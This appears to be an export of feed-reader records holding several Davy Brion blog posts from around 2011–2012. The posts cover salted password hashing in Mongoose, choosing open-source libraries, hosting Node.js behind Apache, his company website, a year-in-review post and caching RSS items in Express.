function(passwordString) {this.passwdHash = hash(passwordString, this.salt);};userSchema.methods.isValidPassword = function(passwordString) {return this.passwdHash === hash(passwordString, this.salt);};mongoose.model('User', userSchema);module.exports = mongoose.model('User');</pre></div><p>Notice that the salt property of my User type has its default value set to 'uuid.v1'. In this case, uuid.v1 is a function which will be invoked by Mongoose whenever a new User instance is created. Every User instance will thus have a UUID value stored in its salt property. You can also see that I'm not storing the given passwordString in the setPassword function, but that I calculate the hash value based on the passwordString and the UUID salt value.</p><p>Suppose I create a user with the following code:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var user = new User({name: 'test_user',email: 'blah'});user.setPassword('test');user.save(function(err, result) {if (err) throw err;});</pre></div><p>Its database representation will look like this:</p><div><pre class=\"brush: jscript; title: ; notranslate\">{\"passwdHash\" : \"b604367796274cf64177eec345532fc6ca66c6f0501906f82bb03f7916265e9d\",\"name\" : \"test_user\",\"email\" : \"blah\",\"_id\" : ObjectId(\"4f1dbb2cfa6157b118000001\"),\"salt\" : \"304a33f0-45fc-11e1-80d2-43c594a44fa0\"}</pre></div><p>If an attacker would get access to this, he'd have to generate a rainbow table using the salt value, which takes time, and even then he has no guarantee that the rainbow table will actually contain the correct password. Again, this is why it's so important to use a unique salt for every password. Also, you can use whatever value you want as the salt value so if you can determine it based on some other fields or by using a specific formula you don't need to store the actual salt value. It's recommended to use a long salt value though. Theoretically speaking, it's safer if the salt value isn't stored so clearly as I'm doing here, but even with the salt value clearly visible to a possible attacker, it would still be practically infeasible for him to generate all those rainbow tables.</p><p>And of course, my actual authentication function is still very simple as well:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var authenticate = function(username, password, callback) {User.findOne({ name: username }, function(err, user) {if (err) return callback(new Error('User not found'));if (user.isValidPassword(password)) return callback(null, user);return callback(new Error('Invalid password'));});};</pre></div><p>So as you can see, there's nothing hard or complicated about storing credentials in a secure manner. It's quite easy to do so and there are no downsides to doing this.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/bskd34YcIcg\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1210}}
{"k":"0000000084","o":"0000005870","v":"001"}
{"_id":1211,"_uid":1211,"_dt":1373742620961,"_s":"939cff56f1a8c1dfc5fd1557ceccdf4f"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/4BpBYXj8pYY/","title":"How Do You Pick Open Source Libraries?","published":{"$wrap":"$date","v":1326748540000,"h":"2012-01-16T21:15:40.000Z"},"starred":false,"read":false,"content":"<p>I'm currently looking into which library I'm going to use to handle authentication in a breakable toy project. Now, despite it being just a breakable toy, I want to do it with as few constraints on technical quality as possible because I want to maximize the learning experience I'm going to get from it. That means I don't just want to quickly put something together that just works. I want something that works, but that would also hold up in real world scenarios, even though the project will at best only be used by myself. Which means that I'm going to be picky about any libraries that I take a dependency on, just as I would if this were a project that I'd be getting paid to work on.</p><p>So as I was browsing through a few possible alternatives for my authentication needs, I started thinking about my thought process when evaluating libraries/frameworks to use. I generally base my decision on the following items, listed in order of importance (to me):</p><ul><li><strong>How well does it work for my scenario?</strong> If a library satisfies all other items on this list, that certainly doesn't mean it's an automatic lock. How it works and the impact it has on my code is definitely the most important factor.</li><li><strong>Popularity</strong>. I've noticed that I let the number of watchers/forks on sites like Github influence my opinion. If a project has many watchers and many forks, odds are high that there's a relatively large group of happy users as well as people involved with the project. It also increases the odds that the project will be around for a while. Of course, inactive Open Source projects often remain available as well but if nobody's working on it, I'm not exactly tempted to take a dependency on it. Log4net is a notable exception to this, obviously. But when a project has a lot of people interested in it, or better yet, contributing to it, it's a good sign that you'll easily get help if needed, it's only going to get better in the long run and that it might get forked should the original developers stop working on it. As the author of an Open Source project that doesn't have a lot of watchers/forks (<ahref=\"https://github.com/davybrion/Agatha\">Agatha</a>), I'm aware that my point of view on this is rather hypocritical but hey, it is what it is.</li><li><strong>Code quality</strong>. I don't have the time to do an in-depth review of the code as I'm sure most of us don't do either. But I do like to glance over the code to get a general feel of the quality of the code. I focus mostly on the clarity of the code and also keep an eye open for sloppiness or downright WTF's. I guess the questions I'm mostly trying to answer when doing this are: \"is this code I'd like to try to improve or fix if I need to?\" and \"how easy would it be to debug this when I need to troubleshoot some non-obvious issues?\".</li><li><strong>Location of code and issue tracker</strong>. A lot of people will probably take issue with this, but I consider it to be a major plus if the project is on Github. Not just because of my personal preference of Github, but because they truly encourage people to collaborate and contribute to projects and they make it very easy to do so. Also, the site is fast! I cringe when I have to look over issues of projects on Codeplex because it's just terribly slow. And the UI doesn't come close to that of Github either. I've heard that Bitbucket is pretty similar to Github, but I've never even looked for projects there. In any case: I want to be able to download the <em>latest</em> version of the code at any time, or of a particular branch if I need to, as easily as possible. I also prefer an issue tracker which is fast, responsive and easy to search. It doesn't have to be Github, but those 2 requirements are important to me.</li><li><strong>License</strong>. If it's GPL, I don't use it. Also, I check whether or not a commercial license needs to be purchased when you want to use the library/framework in production. Pay attention to dual-licensed projects because that Open Source license might not apply to commercial/production use!</li></ul><p>I'd love to hear your thoughts on this. Did I miss any important factors? I just quickly put this post together so it's likely that I missed some good ones <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=4BpBYXj8pYY:lkkPo1JSHCM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=4BpBYXj8pYY:lkkPo1JSHCM:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=4BpBYXj8pYY:lkkPo1JSHCM:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=4BpBYXj8pYY:lkkPo1JSHCM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=4BpBYXj8pYY:lkkPo1JSHCM:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=4BpBYXj8pYY:lkkPo1JSHCM:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=4BpBYXj8pYY:lkkPo1JSHCM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=4BpBYXj8pYY:lkkPo1JSHCM:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/4BpBYXj8pYY\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1211}}
{"k":"0000000084","o":"0000004999","v":"001"}
{"_id":1212,"_uid":1212,"_dt":1373742620961,"_s":"38f94bbb5e7635284dc34e241c7ff3e4"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/r3DqhWiU0Qc/","title":"Hosting A Node.js Site Through Apache","published":{"$wrap":"$date","v":1326637389000,"h":"2012-01-15T14:23:09.000Z"},"starred":false,"read":false,"content":"<p>I recently lost some time trying to figure out how to host a Node.js site through Apache, so I figured I might as well write a post about how I got it working. Of course, this approach only makes sense if you already have a server that's running Apache and you want to add your Node.js site with minimal impact/changes on your server. If you're not using Apache already but just want to publish a Node.js site, you're better off using Node.js to host it directly, or to put Nginx in front of it since it's more lightweight than Apache. But anyways, here's how you get it working with Apache.</p><p>First of all, you need a way to start your Node.js process automatically when your system boots, and to shut it down when the system is shut down. This will depend on the type of server you're running on. In my case, it's a Debian server so I just went with the <ahref=\"https://github.com/nicokaiser/node-monit/tree/master/init.d\" target=\"_blank\">sysv init script from Nico Kaiser</a>. Another popular alternative is the upstart utility, which is already preinstalled if you're using Ubuntu. Once you have a start|stop|restart script in place, you'll want something to monitor the Node.js process to restart it in case it goes down. An easy to use tool for this is <ahref=\"http://mmonit.com/monit/\" target=\"_blank\">monit</a>. Nico Kaiser again has a good example script available for Node.js on <ahref=\"https://github.com/nicokaiser/node-monit/tree/master/monit/conf.d\" target=\"_blank\">Github</a>.</p><p>Once you have your sysv init or upstart script in place, as well as monit, your Node.js process can stay running on your server. Of course, you probably have it set to listen to connections on some other port than port 80 because that's what your Apache server is listening on. So now, the only thing you have to do is configure Apache to proxy all requests coming in on port 80 through the URL of your Node.js site to your local Node.js process. You'll first need to install <ahref=\"http://httpd.apache.org/docs/2.1/mod/mod_proxy.html\" target=\"_blank\">mod_proxy</a> and <ahref=\"http://httpd.apache.org/docs/2.0/mod/mod_proxy_http.html\" target=\"_blank\">mod_proxy_http</a>. After that, the configuration to make it work is quite easy:</p><div><pre class=\"brush: xml; title: ; notranslate\">&lt;VirtualHost 109.74.199.47:80&gt;ServerAdmin davy.brion@thatextramile.beServerName thatextramile.beServerAlias www.thatextramile.beProxyRequests off&lt;Proxy *&gt;Order deny,allowAllow from all&lt;/Proxy&gt;&lt;Location /&gt;ProxyPass http://localhost:3000/ProxyPassReverse http://localhost:3000/&lt;/Location&gt;&lt;/VirtualHost&gt;</pre></div><p>And that's it. Every request coming in at http://thatextramile.be or http://www.thatextramile.be will be forwarded to http://localhost:3000 where Node.js is listening. Note that the ProxyPassReverse is required to make sure that all HTTP response headers will contain the proxied URL instead of the real one (localhost).</p><p>If you need the raw throughput that Node.js offers, this solution is far from optimal. Every request that comes in through Apache will cause an Apache thread to wait/block until the response is returned from your Node.js process. This is essentially the same as when hosting PHP or Ruby through Apache, so it's not a problem, but it does take away one of the benefits of using Node.js. Again, this approach only makes sense if you're already using Apache to host other sites and you just want to add a Node.js site with minimal impact to your server.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/r3DqhWiU0Qc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1212}}
{"k":"0000000084","o":"0000004291","v":"001"}
{"_id":1213,"_uid":1213,"_dt":1373742620961,"_s":"0ea4b385be697624f674cd7ab292d640"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/r-HQC-l9-nk/","title":"Company Website Finally Online","published":{"$wrap":"$date","v":1326620359000,"h":"2012-01-15T09:39:19.000Z"},"starred":false,"read":false,"content":"<p>I finally got around to putting my new <ahref=\"http://thatextramile.be\" target=\"_blank\">company website</a> online. I originally planned to do this sometime last year, but it just kept getting postponed for a variety of reasons. I'm pretty bad at graphic/web design so I had the design done by <ahref=\"http://frozenyogurt.be/\" target=\"_blank\">Ken Bekaert</a> since I thought he had already done a great job on my <ahref=\"http://twitpic.com/5zgm99\" target=\"_blank\">logo and business cards</a>. Next up was the slicing of the design to HTML and CSS. I could theoretically do that myself, but it would've taken me way too long and I would not have enjoyed it one bit, so I preferred to have it done by some old <ahref=\"http://nivario.be/\" target=\"_blank\">friends who know what they're doing</a>. After that, it was finally my turn to play around with it <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>So of course, I couldn't resist doing the site with Express/Node.js. And I'm pretty happy with the result too: about <ahref=\"https://github.com/davybrion/companysite/tree/master/lib\" target=\"_blank\">130 lines of server-side code</a> that allows me to write the content of the site in Markdown (including caching and automatically updating the cache if the Markdown files are updated) and my <ahref=\"http://davybrion.com/blog/2011/12/displaying-feed-items-on-a-web-page-my-solution/\" target=\"_blank\">preferred solution to displaying feed items</a>. Does a simple site like this call for Express/Node.js? Of course not. But I knew it would be simple and fun, so that's why I used it.</p><p>The hardest part was actually writing the content of the site. Apparently, writing content for a company website is a lot harder than churning out a few blog posts occasionally, and I definitely underestimated that. Not because there's a lot of content (there's very little actually), but because you want to <em>avoid</em> ending up with a lot of content. It has to be concise and yet still contain everything you want it to say. After many revisions, it says everything I want it to say, and unlike on this blog I actually managed to keep it short <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>An extra benefit of doing it with Express/Node.js is that it reminded me how much fun I have working with that stack, so I'm going to get back to work on my <ahref=\"https://github.com/davybrion/therabbithole\" target=\"_blank\">breakable toy</a> which I've been neglecting for too long. I suppose this will lead to a few future posts as well <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r-HQC-l9-nk:LXDSSiTB9kI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r-HQC-l9-nk:LXDSSiTB9kI:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r-HQC-l9-nk:LXDSSiTB9kI:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r-HQC-l9-nk:LXDSSiTB9kI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r-HQC-l9-nk:LXDSSiTB9kI:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r-HQC-l9-nk:LXDSSiTB9kI:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r-HQC-l9-nk:LXDSSiTB9kI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r-HQC-l9-nk:LXDSSiTB9kI:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/r-HQC-l9-nk\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1213}}
{"k":"0000000084","o":"0000005389","v":"001"}
{"_id":1214,"_uid":1214,"_dt":1373742620961,"_s":"8eef0fdb3b9a6de02f1aeff5545ef4de"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/kthPy9_wMg0/","title":"Looking Back On 2011","published":{"$wrap":"$date","v":1324928589000,"h":"2011-12-26T19:43:09.000Z"},"starred":false,"read":false,"content":"<p>This was my first year working as an independent, and it's been quite a year. Things have gone very well, and I'm amazed at how quickly it all went by. This time last year, I was looking forward to start working for my first client though I didn't quite know what to expect. I hoped it would be interesting, and it certainly has been. I've been able to work with interesting technologies, with the kind of technical variety that I've come to really enjoy. I wrote more code in JavaScript than in C# this year, and I've also been able to do quite a bit of Ruby as well. I certainly didn't expect that going into this contract, so that was a major bonus. Even better than the technologies I've been able to work with this year are the people I've worked with. The team I've worked with has a fantastic mix of experience, knowledge and talent and it feels like all of us continuously learn new things from each other which is a situation I can only recommend to every developer.</p><p>Another great part about being independent is that you're free to do extra things on the side as well. I'm very happy with the responses that I've gotten from the people who've taken my <ahref=\"http://thatextramile.be/training/nhibernate\">NHibernate course</a>, and I'm going to continue to offer it in 2012. I initially thought it would be something I'd do once or twice, but I was able to do the course 4 times this year: 1 public and 3 private ones. I've got another private one scheduled in February and will organize another public course in 2012, though this time I'm taking care of the whole thing myself instead of working with another company to organize it.</p><p>The most important thing I've learned from this first year is that it's important not to try to do too much. The first 6 months of 2011 were way too busy and hectic, and I only spent one full day doing absolutely nothing work-related. I've been taking things much slower since July and I'm spending much more time enjoying other things in life outside of work. For 2012, my biggest priority is pacing myself much better and spreading things out more. I always seem to alternate between months where I'm always working on something, followed by months of doing as little as possible outside of the 40 hours a week I do for my client. Hopefully, I can finally find a maintainable balance between those two extremes in 2012 <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>On the blogging front, 2011 was a different year than the previous ones on this blog. In the previous years, I averaged about 150 posts a year but this year I only published 71 posts. And I'm actually happy about that. In fact, I hope to get that number down to 50 next year. I still like writing posts, but I no longer feel the need to like I did in the past while I was trying to build a bit of an audience. That often meant pushing myself to keep publishing new posts. Nowadays, I'll only write a post if I really feel like it, which in the long run is much more sustainable anyway. As far as topics covered this year, things have changed quite a bit as well. Some of my views, opinions and technical preferences have changed this year, which naturally reflects in the content I've published. I'm sure I've lost some readers this year because of it, but I also seem to have gained a lot more readers than I've lost. I don't know yet what I'll be writing about in 2012, but I will continue to push people to learn new things (or old things that people seem to forget about) and do better like I always have on this blog, in my own unique way of course <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>I hope you all enjoyed Christmas, and I wish you all a happy 2012. If it does turn out to be our last year on this planet, we might as well make it count.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=kthPy9_wMg0:graD7mYys-A:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=kthPy9_wMg0:graD7mYys-A:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=kthPy9_wMg0:graD7mYys-A:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=kthPy9_wMg0:graD7mYys-A:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=kthPy9_wMg0:graD7mYys-A:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=kthPy9_wMg0:graD7mYys-A:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=kthPy9_wMg0:graD7mYys-A:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=kthPy9_wMg0:graD7mYys-A:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/kthPy9_wMg0\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1214}}
{"k":"0000000084","o":"0000007360","v":"001"}
{"_id":1215,"_uid":1215,"_dt":1373742620961,"_s":"d612522df7d0a241e412f4547996b478"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/YOg6tZlA7JI/","title":"Displaying Feed Items On A Web Page: My Solution","published":{"$wrap":"$date","v":1324364455000,"h":"2011-12-20T07:00:55.000Z"},"starred":false,"read":false,"content":"<p>A couple of days ago I <ahref=\"http://davybrion.com/blog/2011/12/challenge-displaying-feed-items-on-a-web-page/\">asked you</a> how you'd implement showing links from an RSS feed on a web page (in this case: my new company web site). These are my requirements for this:</p><ul><li>It needs to be <strong>fast</strong></li><li>The fewer requests that are impacted by retrieving the feed data, the better</li><li>If I publish a post, the links on the company website should contain the new link within 30 minutes</li><li>The simpler the solution, the better</li></ul><p>I came up with a very simple solution, which satisfies these requirements better than any other solution I could think of, or heard of from other people. It is extremely fast, doesn't delay any requests, and doesn't require me to deploy anything but the company website. I'm building the site with <ahref=\"http://expressjs.com/\">Express</a> on <ahref=\"http://nodejs.org/\">Node.js</a>, which means I can take full advantage of the asynchronous nature of Node.js to implement this.</p><p>Let's go over the code... in the script that starts the express server, I have the following code:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var express = require('express'),app = module.exports = express.createServer(),NodePie = require('nodepie'),request = require('request'),recentFeedItems = null;app.dynamicHelpers({getRecentFeedItems: function() {return recentFeedItems;}});// ... some extra configuration of Express that isn't relevant to this postvar processFeed = function(callback) {request('http://feeds.feedburner.com/davybrion', function(err, response, body) {if (!err && response.statusCode == 200) {var feed = new NodePie(body);feed.init();recentFeedItems = feed.getItems(0, 5);if (callback) callback();};});};setInterval(processFeed, 1800000); // process feed items every 30 minutesprocessFeed(function() {app.listen(3000);console.log('Express started on port 3000');});</pre></div><p>I'll discuss the code in just a moment, but first I want to show the view code that renders the links:</p><div><pre class=\"brush: xml; title: ; notranslate\">&lt;ul&gt;&lt;% getRecentFeedItems.forEach(function(item) { %&gt;&lt;li&gt;&lt;time class=\"date\"&gt;&lt;%= item.getDate().getDate() + '/' + (item.getDate().getMonth() + 1) %&gt;&lt;/time&gt;&lt;a href=\"&lt;%= item.getPermalink() %&gt;\"&gt;&lt;%= item.getTitle() %&gt;&lt;/a&gt;&lt;/li&gt;&lt;% }); %&gt;&lt;/ul&gt;</pre></div><p>And that's all. This is the solution in its entirety!</p><p>If you're new to Node, this code probably requires some explanation. Let's start with this part:</p><div><pre class=\"brush: jscript; title: ; notranslate\">app.dynamicHelpers({getRecentFeedItems: function() {return recentFeedItems;}});</pre></div><p>Here I'm adding a dynamic helper to the Express application. It basically means that my views have access to the getRecentFeedItems function, which returns the value of the recentFeedItems variable. It's important to know that the getRecentFeedItems function creates a closure on the recentFeedItems variable created above it. That means that if the value of the recentFeedItems variable changes at any point in time, the getRecentFeedItems function will return that new value.</p><div><pre class=\"brush: jscript; title: ; notranslate\">var processFeed = function(callback) {request('http://feeds.feedburner.com/davybrion', function(err, response, body) {if (!err && response.statusCode == 200) {var feed = new NodePie(body);feed.init();recentFeedItems = feed.getItems(0, 5);if (callback) callback();};});};</pre></div><p>This just creates a function that we can use later on. It retrieves the feed asynchronously, and when the result is retrieved, we parse the feed using the NodePie library and we get the 5 most recent items which we store in the recentFeedItems variable. Again, this creates a closure on the recentFeedItems variable which means that every time we assign a value to this variable, any subsequent call to the getRecentFeedItems function will return the value we just assigned to it because both functions point to the same memory thanks to the magic of closures. Finally, if a callback is provided as a parameter, the callback will be invoked.</p><div><pre class=\"brush: jscript; title: ; notranslate\">setInterval(processFeed, 1800000); // process feed items every 30 minutesprocessFeed(function() {app.listen(3000);console.log('Express started on port 3000');});</pre></div><p>The call to setInterval makes sure that the processFeed function is called every 30 minutes. After that, we call the processFeed function manually, and we pass in a callback where we start the Express server. This guarantees that the feed items will be in memory before the server starts processing requests.</p><p>What makes this solution so great is that we take full advantage of some of Node's benefits. Whenever we retrieve the RSS feed, Node.JS will retrieve that data asynchronously. As soon as it has fired the request to get the RSS feed, it just goes to the next event in its eventloop so no request is kept waiting while we wait for the data to be downloaded. Until the data from the RSS feed is returned, each request will just use the items that are stored in the recentFeedItems variable. Once the data has been returned, our callback is executed which overwrites the value of the recentFeedItems variable. We don't need to do any locking here because the Node.JS eventloop is single-threaded: while our callback is running, no other code that has access to the recentFeedItems variable can be executed anyway. And the actual parsing of the RSS feed is done by NodePie, which uses <ahref=\"http://expat.sourceforge.net/\">expat</a> behind the scenes, which is supposedly the fastest C XML parser available.</p><p>Looking back on my initial requirements, I think this solution matches very well.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/YOg6tZlA7JI\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1215}}
{"k":"0000000084","o":"0000003362","v":"001"}
{"_id":1216,"_uid":1216,"_dt":1373742620961,"_s":"7c43e0dce7707ac13bf2253a054a8920"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/Awt1njA8rQU/","title":"Challenge: Displaying Feed Items On A Web Page","published":{"$wrap":"$date","v":1324135061000,"h":"2011-12-17T15:17:41.000Z"},"starred":false,"read":false,"content":"<p>I'm finally getting around to implementing the website for my company, and there's one small part of it that's quite interesting from an implementation point of view. The website will have a footer on each page which displays links to my 5 most recent blog posts:</p><p><ahref=\"http://davybrion.com/blog/wp-content/uploads/2011/12/feed_items.png\" rel=\"prettyPhoto[3822]\"><imgsrc=\"http://davybrion.com/blog/wp-content/uploads/2011/12/feed_items.png\" alt=\"\" title=\"feed_items\" width=\"683\" height=\"402\" class=\"aligncenter size-full wp-image-3823\" /></a></p><p>Of course, I don't want to update those links manually whenever I publish a new post, so they need to be retrieved from my blog's RSS feed, which is published by Feedburner. I was hoping to be able to retrieve only the metadata from the posts (date, title and URL is all I need) because my feed always contains the last 20 posts and its total size is usually above 100KB. I haven't found a way to do that, so getting the information I need has to be retrieved through the full feed. Sure, 100KB isn't much but keep in mind that you need to retrieve it and parse it and that I absolutely want to minimize the time each request takes and that I'd rather not see any visual delays on the page either.</p><p>I'm interested in hearing how you would implement this. You have total freedom to pick the technologies you'd like to use and no limits on how you'd use them. My only requirements are these:</p><ul><li>It needs to be <strong>fast</strong></li><li>The fewer requests that are impacted by retrieving the feed data, the better</li><li>If I publish a post, the links on the company website should contain the new link within 30 minutes</li><li>The simpler the solution, the better</li></ul><p>My solution can be found <ahref=\"http://davybrion.com/blog/2011/12/displaying-feed-items-on-a-web-page-my-solution/\">here</a>.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=Awt1njA8rQU:7Gti5R8zH_4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=Awt1njA8rQU:7Gti5R8zH_4:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=Awt1njA8rQU:7Gti5R8zH_4:D7DqB2pKExk\" 